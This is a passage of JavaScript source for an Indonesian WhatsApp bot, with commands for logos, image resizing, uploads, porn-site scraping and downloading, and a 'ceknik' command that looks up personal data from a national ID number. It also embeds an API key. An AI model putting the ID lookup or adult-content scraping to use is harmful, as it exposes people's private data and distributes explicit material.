 await page.click('button[type="submit"]');

 // Tunggu beberapa detik agar hasil bisa diproses
 await page.waitForTimeout(10000); // Tunggu 10 detik, sesuaikan jika perlu

 // Ambil URL gambar hasil logo
 const imageUrl = await page.evaluate(() => {
 const imgElement = document.querySelector('img.result-image'); // Sesuaikan selector dengan elemen gambar
 return imgElement ? imgElement.src : null;
 });

 if (imageUrl) {
 const fetch = require('node-fetch');
 const response = await fetch(imageUrl);
 const buffer = await response.buffer();

 // Mengirim gambar logo menggunakan sky.sendFile
 sky.sendFile(m.chat, buffer, 'logo.png', `Ini logo untuk "${text}"`, m);
 } else {
 m.reply('Gagal mendapatkan gambar dari TextPro.');
 }

 await browser.close();
 })();
}
break
case 'matrix': {
 const puppeteer = require('puppeteer');
 try {
 (async () => {
 const browser = await puppeteer.launch({ headless: true });
 const page = await browser.newPage();
 await page.goto("https://textpro.me/matrix-style-text-effect-online-884.html", {
 waitUntil: "networkidle2"
 });

 await page.type("#text-0", logojoker);
 await page.click("#submit");
 await page.waitForTimeout(3000); // Menunggu 3 detik

 const element = await page.$('div.thumbnail > img');
 if (element) {
 const src = await (await element.getProperty("src")).jsonValue();
 
 // Mengirim gambar menggunakan sky.sendMessage
 await sky.sendMessage(m.chat, { image: { url: src } }, { quoted: m });
 } else {
 m.reply(from, 'Gambar tidak ditemukan', id);
 }

 await browser.close();
 })();
 } catch (error) {
 console.error('Terjadi kesalahan:', error);
 m.reply(from, 'Terjadi kesalahan', id);
 }
}
 break
case 'resize': {
 const { TelegraPh } = require('./lib/uploader');
 const sharp = require('sharp');
 const fs = require('fs');

 // Mengecek apakah ada argumen width dan height
 if (args.length < 2) {
 return m.reply('Tentukan lebar dan tinggi gambar. Contoh: resize 200 300');
 }

 const width = parseInt(args[0]);
 const height = parseInt(args[1]);

 // Memeriksa apakah nilai width dan height valid
 if (isNaN(width) || isNaN(height) || width <= 0 || height <= 0) {
 return m.reply('Lebar dan tinggi harus berupa angka positif yang valid.');
 }

 const q = m.quoted ? m.quoted : m;
 const mime = (q.msg || q).mimetype || '';

 if (!mime || !mime.includes('image')) {
 return m.reply('Mana gambarnya bang?');
 }

 m.reply(mess.wait);

 try {
 // Mengunduh dan menyimpan media
 const media = await sky.downloadAndSaveMediaMessage(q);
 const output = 'resized_output.jpg'; // Nama file output

 // Menggunakan sharp untuk mengubah ukuran gambar
 sharp(media)
 .resize(width, height) // Mengubah ukuran gambar
 .toFile(output, async (err, info) => {
 if (err) {
 console.error(`Error: ${err.message}`);
 return m.reply(`Error: ${err.message}`);
 }

 console.log(`Image resized: ${info}`);

 // Mengunggah gambar yang telah diubah ukurannya
 const url = await TelegraPh(output);
 sky.sendMessage(m.chat, { caption: '_Success To Resize Image_', image: { url } }, { quoted: m });

 // Menghapus file setelah selesai
 fs.unlinkSync(output);
 fs.unlinkSync(media);
 });
 } catch (err) {
 console.error(`Error: ${err.message}`);
 return m.reply(`Error: ${err.message}`);
 }
}
break
case 'jam': {
 // Kirim pesan awal dengan pesan yang akan diubah
 const { key } = await sky.sendMessage(from, { text: 'Memperbarui jam...', previewType: 0 });

 // Jalankan interval untuk memperbarui jam setiap 2 detik
 intervalID = setInterval(async () => {
 const currentTime = new Date();

 // Opsi format waktu
 const options = { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false };

 // Format waktu untuk WIB
 const wibTime = currentTime.toLocaleTimeString('id-ID', { ...options, timeZone: 'Asia/Jakarta' });

 // Format waktu untuk WITA
 const witaTime = currentTime.toLocaleTimeString('id-ID', { ...options, timeZone: 'Asia/Makassar' });

 // Format waktu untuk WIT
 const witTime = currentTime.toLocaleTimeString('id-ID', { ...options, timeZone: 'Asia/Jayapura' });

 // Buat pesan yang menampilkan waktu untuk ketiga zona waktu
 const message = `Saat ini:\nWIB: ${wibTime}\nWITA: ${witaTime}\nWIT: ${witTime}`;

 // Kirim pesan yang diubah dengan waktu saat ini
 await sky.sendMessage(from, { text: message, edit: key });
 }, 2000);
}
break
case 'deletechat': {
 if (!isCreator) return m.reply(mess.owner);
 
 // Memastikan argumen berisi nomor target
 const targetNumber = args[0];
 if (!targetNumber) {
 m.reply('Tentukan nomor pengguna yang valid untuk menghapus chat.');
 return;
 }

 // Menghapus semua chat dari nomor target
 try {
 await sky.chatModify(
 {
 delete: true
 }, 
 targetNumber + '@s.whatsapp.net', 
 []
 );
 m.reply(`Chat dari nomor ${targetNumber} telah dihapus.`);
 } catch (error) {
 if (error.message.includes('myAppStateKey ("AAAAAK5z") not present')) {
 m.reply('Gagal menghapus chat. Kesalahan: myAppStateKey tidak ditemukan.');
 } else {
 m.reply(`Gagal menghapus chat. Kesalahan: ${error.message}`);
 }
 }
}
break;
case 'tourl10': {
 const fetch = require('node-fetch');
 const fileType = require('file-type');
 const FormData = require('form-data');
 const fs = require('fs');

 async function mediaUpload(mediaPath) {
 try {
 const buffer = fs.readFileSync(mediaPath);
 const { ext, mime } = await fileType.fromBuffer(buffer) || {};
 if (!ext || !mime) throw new Error("Cannot detect file type");

 const formData = new FormData();
 formData.append("files[]", buffer, {
 filename: `file-${Date.now()}.${ext}`,
 contentType: mime,
 });

 const response = await fetch("https://media-upload.net/php/ajax_upload_file.php", {
 method: "POST",
 body: formData,
 headers: {
 "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36",
 ...formData.getHeaders(),
 },
 });

 if (!response.ok) {
 const errorText = await response.text();
 throw new Error(`Upload failed with status ${response.status}: ${errorText}`);
 }

 const files = await response.json();
 if (!files.files || !files.files[0] || !files.files[0].fileUrl) {
 throw new Error("Failed to retrieve file URL");
 }

 return files.files[0].fileUrl;
 } catch (error) {
 throw new Error(`Upload failed: ${error.message}`);
 }
 }

 try {
 m.reply('Sedang memuat...');

 let media = await sky.downloadAndSaveMediaMessage(qmsg);

 if (fs.statSync(media).size > 350000000) {
 m.reply('File terlalu besar, maksimal 350MB');
 return;
 }

 let url = await mediaUpload(media);
 m.reply(`Link: ${url}`);

 fs.unlinkSync(media);
 } catch (err) {
 m.reply(`Terjadi kesalahan saat mengunggah file: ${err.message}`);
 }
}
break
case 'lora': {
 let [text1, text2] = text.split("|");
 console.log({ text1, text2 });
 if (!text1 || !text2) {
 return m.reply(`*Here is Tutorial!*\n\n*Pay attention to the following instructions!*\n[ StableDiffusion - Lora++ ]\n\nUsage: <prefix><command> <ID>|<prompt>\nExample : #lora 3|beautiful cat with aesthetic jellyfish, sea god theme\n\n => _ID is the number of models available in the list_\n\n_*please see the list of available models:*_\n\n*[ID] [NAME]*\n \n[1] [Donghua#01]\n[2] [YunXi - PerfectWorld]\n[3] [Sea God (Tang San) - Douluo Dalu]\n[4] [XiaoYiXian - Battle Through the Heavens]\n[5] [God of Angels (Xian Renxue) - Douluo Dalu]\n[6] [Sheng Cai'er - Throne of Seals]\n[7] [HuTao - Genshin Impact]\n[8] [TangWutong - Unrivaled Tang Sect]\n[9] [CaiLin (Medusa) - Battle Through the Heavens]\n[10] [Elaina - Majo No TabiTabi]\n[11] [Jiang Nanan - The Unrivaled Tang Sect]\n[12] [Cailin (Queen Medusa) - BTTH [ 4KUltraHD]]\n[13] [MaXiaoTao - The Unrivaled Tang Sect]\n[14] [Yor Forger - Spy x Family]\n[15] [Boboiboy Galaxy]\n[16] [Hisoka morow]\n[17] [Ling Luochen - Unrivaled Tang Sect]\n[18] [Tang Wutong - Unrivaled Tang Sect]\n[19] [Huo Yuhao - Unrivaled Tang Sect]`);
 }

 try {
 let imageUrl = `https://ai.xterm.codes/api/text2img/instant-lora?id=${encodeURIComponent(text1)}&prompt=${encodeURIComponent(text2)}&key=Bell409`;
 await sky.sendMessage(m.chat, { image: { url: imageUrl } }, { quoted: m });
 } catch (error) {
 m.reply('❗ Layanan sedang gangguan, coba lagi nanti.');
 }
}
break
case 'xnxxsearch': {
 if (!isPrem) return replyprem(mess.premium)
 async function xnxxsearch(query) {
 return new Promise((resolve, reject) => {
 const baseurl = 'https://www.xnxx.com';
 fetch(`${baseurl}/search/${query}/${Math.floor(Math.random() * 3) + 1}`, { method: 'get' })
 .then((res) => res.text())
 .then((res) => {
 const $ = cheerio.load(res, { xmlMode: false });
 const title = [];
 const url = [];
 const desc = [];
 const results = [];
 $('div.mozaique').each(function (a, b) {
 $(b).find('div.thumb').each(function (c, d) {
 url.push(baseurl + $(d).find('a').attr('href').replace('/THUMBNUM/', '/'));
 });
 });
 $('div.mozaique').each(function (a, b) {
 $(b).find('div.thumb-under').each(function (c, d) {
 desc.push($(d).find('p.metadata').text());
 $(d).find('a').each(function (e, f) {
 title.push($(f).attr('title'));
 });
 });
 });
 for (let i = 0; i < title.length; i++) {
 results.push({ title: title[i], info: desc[i], link: url[i] });
 }
 resolve({ code: 200, status: true, result: results });
 })
 .catch((err) => reject({ code: 503, status: false, result: err }));
 });
 }

 const query = args.join(' ');
 if (!query) {
 m.reply('Tentukan query untuk pencarian.');
 return;
 }

 m.reply('🔍 Mencari video, harap tunggu...');

 xnxxsearch(query).then(response => {
 if (response.code !== 200 || !response.status) {
 m.reply('❗ Terjadi kesalahan saat melakukan pencarian.');
 return;
 }

 let results = '📜 *Hasil Pencarian* 📜\n\n';
 response.result.forEach((item, index) => {
 results += `*${index + 1}. ${item.title}*\n`;
 results += `_${item.info}_\n`;
 results += `[Link Video](${item.link})\n\n`;
 });

 m.reply(results);
 }).catch(error => {
 m.reply('❗ Terjadi kesalahan: ' + error.result);
 });
}
break
case 'xnxxdl': {
 if (!isPrem) return replyprem(mess.premium)
 
 async function xnxxdl(URL) {
 return new Promise((resolve, reject) => {
 fetch(`${URL}`, {method: 'get'})
 .then((res) => res.text())
 .then((res) => {
 const $ = cheerio.load(res, {xmlMode: false});
 const title = $('meta[property="og:title"]').attr('content');
 const duration = $('meta[property="og:duration"]').attr('content');
 const image = $('meta[property="og:image"]').attr('content');
 const videoType = $('meta[property="og:video:type"]').attr('content');
 const videoWidth = $('meta[property="og:video:width"]').attr('content');
 const videoHeight = $('meta[property="og:video:height"]').attr('content');
 const info = $('span.metadata').text();
 const videoScript = $('#video-player-bg > script:nth-child(6)').html();
 const files = {
 low: (videoScript.match(/html5player.setVideoUrlLow\('(.*?)'\);/) || [])[1],
 high: (videoScript.match(/html5player.setVideoUrlHigh\('(.*?)'\);/) || [])[1],
 HLS: (videoScript.match(/html5player.setVideoHLS\('(.*?)'\);/) || [])[1],
 thumb: (videoScript.match(/html5player.setThumbUrl\('(.*?)'\);/) || [])[1],
 thumb69: (videoScript.match(/html5player.setThumbUrl169\('(.*?)'\);/) || [])[1],
 thumbSlide: (videoScript.match(/html5player.setThumbSlide\('(.*?)'\);/) || [])[1],
 thumbSlideBig: (videoScript.match(/html5player.setThumbSlideBig\('(.*?)'\);/) || [])[1]
 };
 resolve({status: 200, result: {title, URL, duration, image, videoType, videoWidth, videoHeight, info, files}});
 })
 .catch((err) => reject({code: 503, status: false, result: err}));
 });
 } 
 m.reply('wait');
 let xnxxLink = '';
 if (args[0].includes('xnxx')) {
 xnxxLink = args[0];
 } else {
 const index = parseInt(args[0]) - 1;
 if (index >= 0) {
 if (Array.isArray(global.videoListXXX) && global.videoListXXX.length > 0) {
 const matchingItem = global.videoListXXX.find((item) => item.from === m.sender);
 if (matchingItem && index < matchingItem.urls.length) {
 xnxxLink = matchingItem.urls[index];
 }
 }
 }
 }
 
 if (!xnxxLink) {
 return m.reply(`*[❗] Link tidak valid atau tidak ditemukan. Pastikan Anda telah melakukan pencarian video dengan benar.*`);
 }
 
 const res = await xnxxdl(xnxxLink);
 const json = res.result.files;
 sky.sendMessage(m.chat, {video: {url: json.high}, caption: res.result.title}, {quoted: m});
};
break
case 'xnxxplay': {
 if (!isPrem) return replyprem(mess.premium)

 async function xnxxsearch(query) {
 return new Promise((resolve, reject) => {
 const baseurl = 'https://www.xnxx.com';
 fetch(`${baseurl}/search/${query}/${Math.floor(Math.random() * 3) + 1}`, { method: 'get' })
 .then((res) => res.text())
 .then((res) => {
 const $ = cheerio.load(res, { xmlMode: false });
 const title = [];
 const url = [];
 $('div.mozaique').each(function (a, b) {
 $(b).find('div.thumb').each(function (c, d) {
 url.push(baseurl + $(d).find('a').attr('href').replace('/THUMBNUM/', '/'));
 });
 });
 $('div.mozaique').each(function (a, b) {
 $(b).find('div.thumb-under').each(function (c, d) {
 $(d).find('a').each(function (e, f) {
 title.push($(f).attr('title'));
 });
 });
 });
 const results = [];
 for (let i = 0; i < title.length; i++) {
 results.push({ title: title[i], link: url[i] });
 }
 resolve({ code: 200, status: true, result: results });
 })
 .catch((err) => reject({ code: 503, status: false, result: err }));
 });
 }

 async function xnxxdl(URL) {
 return new Promise((resolve, reject) => {
 fetch(`${URL}`, { method: 'get' })
 .then((res) => res.text())
 .then((res) => {
 const $ = cheerio.load(res, { xmlMode: false });
 const title = $('meta[property="og:title"]').attr('content');
 const videoScript = $('#video-player-bg > script:nth-child(6)').html();
 const files = {
 high: (videoScript.match(/html5player.setVideoUrlHigh\('(.*?)'\);/) || [])[1],
 };
 resolve({ status: 200, result: { title, URL, files } });
 })
 .catch((err) => reject({ code: 503, status: false, result: err }));
 });
 }

 const query = args.join(' ');
 if (!query) {
 m.reply('Tentukan query untuk pencarian.');
 return;
 }

 m.reply('_ywdah tunggu_');

 xnxxsearch(query).then(async response => {
 if (response.code !== 200 || !response.status || response.result.length === 0) {
 m.reply('Tidak ditemukan hasil pencarian untuk query tersebut.');
 return;
 }

 // Pilih video acak dari hasil pencarian
 const randomResult = response.result[Math.floor(Math.random() * response.result.length)];

 // Download video dari hasil acak
 const res = await xnxxdl(randomResult.link);
 const json = res.result.files;
 sky.sendMessage(m.chat, { video: { url: json.high }, caption: res.result.title }, { quoted: m });

 }).catch(error => {
 m.reply('Terjadi kesalahan: ' + error.result);
 });
};
break
case 'ceknik': {
const { CekNik } = require("./lib/scrape");
 if (!text) {
 return m.reply(`Masukkan NIK!\n\nContoh: *${command} xxx*`);
 }
 if (text.length > 16) {
 return m.reply('Maksimal 16 Digit!');
 }
 if (isNaN(text)) {
 return m.reply(`NIK Harus Angka!\n\nContoh: *${command} 123456xxx*`);
 }

 let res;
 try {
 res = await CekNik(text);
 } catch (error) {
 return m.reply('Terjadi kesalahan saat memeriksa NIK. Coba lagi nanti.');
 }

 if (!res.data) {
 return m.reply('Data tidak ditemukan. Pastikan NIK yang dimasukkan benar.');
 }

 let {
 nik,
 kelamin,
 lahir,
 provinsi,
 kotakab,
 kecamatan,
 uniqcode,
 tambahan: {
 kodepos,
 pasaran,
 usia,
 ultah,
 zodiak
 }
 } = res.data;

 let hasil = `*Data Kependudukan*

NIK: ${nik}
Kelamin: ${kelamin}
Tempat dan Tanggal Lahir: ${lahir}
Provinsi: ${provinsi}
Kota/Kabupaten: ${kotakab}
Kecamatan: ${kecamatan}
Kode Unik: ${uniqcode}

*Data Tambahan*

Kode Pos: ${kodepos}
Pasaran: ${pasaran}
Usia: ${usia}
Tanggal Ultah: ${ultah}
Zodiak: ${zodiak}`;

 m.reply(hasil);
 }
 break
case 'denc': {
 const { Deobfuscator } = require("deobfuscator");
 const usage = `Contoh:\n${command} (Input teks atau balas teks untuk deobfuscate)\n${command} doc (Balas dokumen)`;
 let text;

 if (args.length >= 1) {
 text = args.join(" ");
 } else if (m.quoted && m.quoted.text) {
 text = m.quoted.text;
 } else {
 return m.reply(usage);
 }

 async function Decrypt(query) {
 const deobfuscatedCode = new Deobfuscator();
 try {
 // Mendapatkan hasil deobfuscation
 return await deobfuscatedCode.deobfuscateSource(query);
 } catch (error) {
 console.error("Deobfuscation error:", error);
 throw new Error("Gagal mendekripsi teks.");
 }
 }

 try {
 if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
 let docBuffer;
 if (m.quoted.mimetype) {
 docBuffer = await m.quoted.download();
 // Memastikan dokumen berupa teks
 const docText = docBuffer.toString('utf-8');
 const message = await Decrypt(docText);
 await m.reply(message);
 } else {
 await m.reply("Dokumen tidak valid.");
 }
 } else {
 const message = await Decrypt(text);
 await m.reply(message);
 }
 } catch (error) {
 const errorMessage = `Terjadi kesalahan: ${error.message}`;
 await m.reply(errorMessage);
 }
}
break
case 'enc': {
const JavaScriptObfuscator = require('javascript-obfuscator');
 // Memeriksa apakah pengguna adalah creator
 if (!isCreator) {
 m.reply('Hanya creator yang dapat menggunakan perintah ini.');
 return;
 }

 // Mendapatkan kode JavaScript dari argumen
 const jsCode = args.join(' ');
 if (!jsCode) {
 m.reply('Kirimkan kode JavaScript yang ingin diobfuscate.');
 return;
 }

 // Menggunakan JavaScript Obfuscator untuk mengobfuscate kode
 const obfuscationResult = JavaScriptObfuscator.obfuscate(jsCode, {
 compact: true,
 controlFlowFlattening: true,
 });

 // Mengirimkan kode JavaScript yang telah diobfuscate
 m.reply(`Kode JavaScript yang telah diobfuscate:\n\n${obfuscationResult.getObfuscatedCode()}`);
}
break
case 'menu': {
 let menuText = `
> \`m e n u g r u p\`
> \`m e n u a n i m e\`
> \`m e n u n s f w ( n e w v²)\`
> \`m e n u o w n e r\`
> \`m e n u c o n v e r t\`
> \`m e n u m a i n\`
> \`m e n u d o w n\`
> \`m e n u p r i m b o n\`
> \`m e n u s u p\`
> \`m e n u m a i n\`
> \`m e n u r a n d o m\`
> \`m e n u f u n\`
> \`m e n u s e a r c h\`
> \`a l l m e n u ( s o o n )\`

°𝘦𝘳𝘳𝘰𝘳? 𝘴𝘦𝘯𝘥 𝘵𝘰 𝘰𝘸𝘯𝘦𝘳°
 `;
 
m.reply(menuText);
}
break










case 'anal': {
 try {
 const response = await fetch('https://purrbot.site/api/img/nsfw/anal/gif');
 const result = await response.json();
 const gifUrl = result.link; 
 sendGif(gifUrl, m.chat, 'Berikut GIF yang Anda minta:');
 } catch (error) {
 m.reply('Terjadi kesalahan saat mengambil GIF.');
 }
 }
 break
case 'listsesi': {
 if (!isCreator) return m.reply(mess.owner);

 const fs = require('fs'); // Pastikan mengimpor modul fs

 fs.readdir("./sky", function(err, files) {
 if (err) {
 console.log('Unable to scan directory: ' + err);
 return m.reply('Unable to scan directory: ' + err);
 }

 // Filter untuk nama file yang relevan
 let filteredArray = files.filter(item => 
 item.startsWith("pre-key") ||
 item.startsWith("sender-key") ||
 item.startsWith("sky-") ||
 item.startsWith("app-state") ||
 item.startsWith("session")
 );

 // Menampilkan jumlah sesi
 m.reply(`Sesi sekarang = ${filteredArray.length} sesi`);
 });
}
break
case 'emoji': {
 if (!text) return m.reply(`Example: ${prefix + command} 😭`);
 
 function toCodePoint(unicodeSurrogates) {
 var r = [], c = 0, p = 0, i = 0;
 while (i < unicodeSurrogates.length) {
 c = unicodeSurrogates.charCodeAt(i++);
 if (p) {
 r.push((0x10000 + (p - 0xD800 << 10) + (c - 0xDC00)).toString(16));
 p = 0;
 } else if (0xD800 <= c && c <= 0xDBFF) {
 p = c;
 } else {
 r.push(c.toString(16));
 }
 }
 return r.join('-');
 }

 const emoji = text;
 const emojiCode = toCodePoint(emoji);
 const gifUrl = `https://fonts.gstatic.com/s/e/notoemoji/latest/${emojiCode}/512.webp`;
 try {
 const response = await fetch(gifUrl, { method: 'HEAD' });
 if (response.ok) {
 sky.sendMessage(m.chat, {sticker: {url: gifUrl }}, { quoted: m })
 } else {
 m.reply('Maaf, emoji ini belum tersedia.');
 }
 } catch (error) {
 m.reply('Terjadi kesalahan saat memproses emoji.');
 }
}
break

case 'inspect': {
 if (!text) return m.reply('Please provide a group link!');
 
 let code = q.match(/chat.whatsapp.com\/([\w\d]*)/g);
 if (code === null) return m.reply('No invite URL detected.');
 
 code = code[0].replace('chat.whatsapp.com/', '');
 
 await sky.groupGetInviteInfo(code).then(anu => {
 let { id, subject, owner, subjectOwner, creation, desc, descId } = anu;

 let par = `_Group Name_ : ${subject}\n` +
 `_ID_ : ${id}\n` +
 `${owner ? `_Creator_ : @${owner.split('@')[0]}` : '_Creator_ : -'}\n` +
 `_Created On_ : ${new Date(creation * 1000).toLocaleString()}\n` +
 `_DescID_ : ${descId ? descId : '-'}\n` +
 `${subjectOwner ? `_Name Changed By_ : @${subjectOwner.split('@')[0]}` : '_Name Changed By_ : -'}\n\n` +
 `_Description_ : ${desc ? desc : '-'}\n`;

 m.reply(par);
 }).catch((res) => {
 if (res.data == 406) return m.reply('Group Not Found❗');
 if (res.data == 410) return m.reply('Group URL Has Been Reset❗');
 });
}
break
case 'getpp': {
 try {
 async function getPp(sky, target) {
 let anu = await sky.query({
 tag: "iq",
 attrs: {
 target: target,
 to: "@s.whatsapp.net",
 type: "get",
 xmlns: "w:profile:picture"
 },
 content: [{
 tag: "picture",
 attrs: {
 type: "image",
 query: "url"
 }
 }]
 });
 return anu.content[0];
}
 if (!m.isGroup) {
 // Jika bukan grup, kirim balasan kesalahan
 return m.reply('Perintah ini hanya bisa digunakan di dalam grup.');
 }

 // Jika m.quoted ada atau teks berisi nomor yang valid, ambil foto profil
 if (m.quoted || text) {
 let who = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
 let onWhatsapp = await sky.onWhatsApp(who);
 let profileData = onWhatsapp.find(item => item.exists);

 if (profileData) {
 let profileJid = profileData.jid;
 let _data = await getPp(sky, profileJid).catch(_ => "https://telegra.ph/file/0b113db9d9e244ea22c81.jpg");
 let _data_url = _data?.attrs?.url || _data;
 let _data_caption = `ni pp`;
 return sky.sendFile(m.chat, _data_url, 'pp.jpg', _data_caption, m);
 } else {
 m.reply("Data gagal di dapatkan,\nSilahkan cek ulang nomor tersebut!");
 }
 } else {
 // Jika tidak ada kutipan atau teks, kirim balasan kesalahan
 m.reply("Tag Atau Reply Lah -_-!");
 }
 } catch (error) {
 console.error('Error:', error);
 m.reply('Terjadi kesalahan saat memproses permintaan.');
 }
}
break
case 'jadwaltv': {
 const axios = require('axios');
 const cheerio = require('cheerio');
 const fs = require('fs');

 async function jadwalTV(name) {
 let list = JSON.parse(fs.readFileSync('./lib/jadwaltv.json', 'utf-8'));
 let data = list.find((v) => (new RegExp(name, 'gi')).test(v.channel)), result = [];
 if (!data) throw 'List Channel Yg Tersedia:\n\n' + list.map(v => v.channel).sort().join('\n');
 let html = (await axios.get(`https://www.jadwaltv.net/${data.isPay ? 'jadwal-pay-tv/' : ''}${data.value}`)).data;
 let $ = cheerio.load(html);
 $('div > table.table').find('tbody > tr').slice(1).each(function () {
 let jam = $(this).find('td').eq(0).text();
 let acara = $(this).find('td').eq(1).text();
 if (!/Jadwal TV/gi.test(acara) && !/Acara/gi.test(acara)) result.push({ jam, acara });
 });
 return { channel: data.channel.toUpperCase(), result };
 }

 if (!text) throw 'Silakan masukkan nama channel TV.';
 
 try {
 const tvSchedule = await jadwalTV(text);
 if (tvSchedule.result.length > 0) {
 const scheduleFormatted = tvSchedule.result.map((item, index) => `${index + 1}. \n> ${item.jam} - ${item.acara}`).join('\n\n');
 m.reply(`Jadwal TV untuk ${tvSchedule.channel}:\n\n${scheduleFormatted}`);
 } else {
 m.reply(`Tidak ada jadwal TV ditemukan untuk ${text}.`);
 }
 } catch (error) {
 m.reply(`Terjadi kesalahan: ${error}`);
 }
}
break
case 'sabda': {
 const axios = require('axios');
 const xml2js = require('xml2js'); // XML to JSON parser

 async function getPassage(name, chapter, number) {
 try {
 if (!name || !chapter || !number) {
 throw new Error('Silahkan isi query name, chapter, dan number, contoh: yohanes 1 1');
 }

 const url = `https://alkitab.sabda.org/api/passage.php?passage=${name.toLowerCase()}+${chapter}:${number}`;
 const response = await axios.get(url);
 const xml = response.data;

 const parser = new xml2js.Parser();
 const jsonData = await parser.parseStringPromise(xml);

 const book = jsonData['bible']['book'][0];
 const chapterData = book['chapter'][0];
 const verses = chapterData['verses'][0]['verse'];

 return {
 title: book['title'][0],
 chapter: chapterData['chap'][0],
 verses: verses.map(verse => ({
 number: verse['number'][0],
 text: verse['text'][0]
 }))
 };
 } catch (err) {
 throw new Error(err.message);
 }
 }

  if (!text) throw 'Silahkan masukkan query dalam format: name chapter number, contoh: yohanes 1 1'

 const [name, chapter, number] = text.split(' ');

 try {
 const passage = await getPassage(name, chapter, number);

 if (passage) {
 const message = `**${passage.title} ${passage.chapter}**\n\n${passage.verses.map(verse => `${verse.number}. ${verse.text}`).join('\n')}`;
 m.reply(message);
 } else {
 m.reply('Tidak ditemukan ayat untuk query tersebut.');
 }
 } catch (error) {
 m.reply(`Terjadi kesalahan: ${error.message}`);
 }
}
break
case 'countrytime': {
 const moment = require('moment-timezone'); // Import moment-timezone

 if (!text) {
 m.reply('Silahkan masukkan nama zona waktu, contoh: Asia/Jakarta');
 break;
 }

 const timezone = text.trim();

 try {
 // Get the current time in the specified timezone
 const currentTime = moment.tz(timezone).format('YYYY-MM-DD HH:mm:ss');
 m.reply(`Waktu saat ini di ${timezone} adalah: ${currentTime}`);
 } catch (error) {
 m.reply(`Terjadi kesalahan: ${error.message}. Pastikan zona waktu yang Anda masukkan benar.`);
 }
}
break
case 'tesaurus': {
 if (!text) throw 'Masukkan kata yang ingin dicari di Tesaurus.'; // Mengecek apakah text ada

 const axios = require('axios');
 const cheerio = require('cheerio');

 function Nomina(query) {
 return new Promise(async (resolve, reject) => {
 try {
 const { data } = await axios.get('https://tesaurus.kemdikbud.go.id/tematis/lema/' + query + '/nomina');
 const $ = cheerio.load(data);
 let _arti = [];
 $('.search-result-area > .result-par > .contain > .result-set').each((i, u) => {
 _arti.push($(u).text().trim());
 });
 resolve({
 lema: query,
 nomina: _arti,
 length: _arti.length
 });
 } catch (err) {
 reject(err);
 }
 });
 }

 Nomina(text)
 .then(result => {
 if (result.length === 0) {
 m.reply('Tidak ada hasil ditemukan di Tesaurus untuk kata tersebut.');
 } else {
 let message = `Sinonim dari "${result.lema}":\n\n`;
 result.nomina.forEach((item, index) => {
 message += `${index + 1}. ${item}\n`;
 });
 m.reply(message);
 }
 })
 .catch(error => {
 m.reply('Terjadi kesalahan saat mengambil data dari Tesaurus.');
 console.error(error);
 });
}
break

case 'resep': {
 const axios = require('axios');
 const cheerio = require('cheerio');

 async function cariresep(query) {
 return new Promise(async (resolve, reject) => {
 axios.get("https://resepkoki.id/?s=" + encodeURIComponent(query)).then(({ data }) => {
 const $ = cheerio.load(data),
 link = [],
 judul = [],
 format = [];
 $("body > div.all-wrapper.with-animations > div:nth-child(5) > div > div.archive-posts.masonry-grid-w.per-row-2 > div.masonry-grid > div > article > div > div.archive-item-media > a").each(function(a, b) {
 link.push($(b).attr("href"));
 });
 $("body > div.all-wrapper.with-animations > div:nth-child(5) > div > div.archive-posts.masonry-grid-w.per-row-2 > div.masonry-grid > div > article > div > div.archive-item-content > header > h3 > a").each(function(c, d) {
 let jud = $(d).text();
 judul.push(jud);
 });
 for (let i = 0; i < link.length; i++) format.push({ judul: judul[i], link: link[i] });
 const result = {
 creator: "Fajar Ihsana",
 data: format.filter(v => v.link.startsWith("https://resepkoki.id/resep"))
 };
 resolve(result);
 }).catch(reject);
 });
 }

 async function detailresep(query) {
 return new Promise(async (resolve, reject) => {
 axios.get(query).then(({ data }) => {
 const $ = cheerio.load(data),
 abahan = [],
 atakaran = [],
 atahap = [];
 $("body > div.all-wrapper.with-animations > div.single-panel.os-container > div.single-panel-details > div > div.single-recipe-ingredients-nutritions > div > table > tbody > tr > td:nth-child(2) > span.ingredient-name").each(function(a, b) {
 let bh = $(b).text();
 abahan.push(bh);
 });
 $("body > div.all-wrapper.with-animations > div.single-panel.os-container > div.single-panel-details > div > div.single-recipe-ingredients-nutritions > div > table > tbody > tr > td:nth-child(2) > span.ingredient-amount").each(function(c, d) {
 let uk = $(d).text();
 atakaran.push(uk);
 });
 $("body > div.all-wrapper.with-animations > div.single-panel.os-container > div.single-panel-main > div.single-content > div.single-steps > table > tbody > tr > td.single-step-description > div > p").each(function(e, f) {
 let th = $(f).text();
 atahap.push(th);
 });
 const judul = $("body > div.all-wrapper.with-animations > div.single-panel.os-container > div.single-title.title-hide-in-desktop > h1").text(),
 waktu = $("body > div.all-wrapper.with-animations > div.single-panel.os-container > div.single-panel-main > div.single-meta > ul > li.single-meta-cooking-time > span").text(),
 hasil = $("body > div.all-wrapper.with-animations > div.single-panel.os-container > div.single-panel-main > div.single-meta > ul > li.single-meta-serves > span").text().split(": ")[1],
 level = $("body > div.all-wrapper.with-animations > div.single-panel.os-container > div.single-panel-main > div.single-meta > ul > li.single-meta-difficulty > span").text().split(": ")[1],
 thumb = $("body > div.all-wrapper.with-animations > div.single-panel.os-container > div.single-panel-details > div > div.single-main-media > img").attr("src");
 let tbahan = "bahan\n";
 for (let i = 0; i < abahan.length; i++) tbahan += abahan[i] + " " + atakaran[i] + "\n";
 let ttahap = "tahap\n";
 for (let i = 0; i < atahap.length; i++) ttahap += atahap[i] + "\n\n";
 const tahap = ttahap,
 result = {
 creator: "Fajar Ihsana",
 data: {
 judul: judul,
 waktu_masak: waktu,
 hasil: hasil,
 tingkat_kesulitan: level,
 thumb: thumb,
 bahan: tbahan.split("bahan\n")[1],
 langkah_langkah: tahap.split("tahap\n")[1]
 }
 };
 resolve(result);
 }).catch(reject);
 });
 }

 async function getResep(query) {
 try {
 if (!query) throw `Mau resep apa?`; // Menangani kasus ketika tidak ada input

 const cariResepResult = await cariresep(query);
 if (cariResepResult.data.length > 0) {
 const detailResepResult = await detailresep(cariResepResult.data[0].link);
 const data = detailResepResult.data;
 const message = `Judul: ${data.judul}\nWaktu Masak: ${data.waktu_masak}\nHasil: ${data.hasil}\nTingkat Kesulitan: ${data.tingkat_kesulitan}\n\nBahan:\n${data.bahan}\n\nLangkah-langkah:\n${data.langkah_langkah}\n\nURL: ${cariResepResult.data[0].link}`;
 m.reply(message);
 } else {
